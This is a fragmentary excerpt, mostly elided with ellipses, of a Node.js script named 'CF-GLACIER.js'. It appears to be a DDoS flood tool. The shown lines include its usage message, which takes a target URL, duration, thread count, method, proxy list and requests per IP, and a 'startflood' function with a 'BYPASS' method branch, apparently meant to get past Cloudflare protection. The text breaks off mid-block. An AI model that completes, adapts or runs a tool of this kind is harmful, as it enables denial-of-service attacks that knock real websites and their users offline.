...
if (process.argv.length < 8){
    ...
    console.log('node CF-GLACIER.js [url] [time] [Thread] [Method] [Proxylist] [Requests Per IP]');
    process.exit(0);
}
...
function startflood(){
    ...
    } else if (process.argv[5].toUpperCase() == "BYPASS") {
        headerbuilders[":method"] = "BYPASS"
        if (randomparam){
            setInterval(() => {
